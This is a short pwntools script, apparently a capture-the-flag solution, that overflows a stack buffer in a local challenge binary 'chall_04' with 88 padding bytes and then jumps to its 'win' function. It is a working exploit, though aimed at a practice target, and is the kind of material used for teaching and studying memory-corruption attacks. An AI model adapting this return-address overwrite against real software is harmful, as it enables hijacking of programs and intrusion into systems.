# coding: utf-8
from pwn import *
0x60
elf=ELF("./chall_04")
payload = b'a'*88+p64(elf.sym.win)
p=process("./chall_04")
p.sendline(payload)
p.interactive()
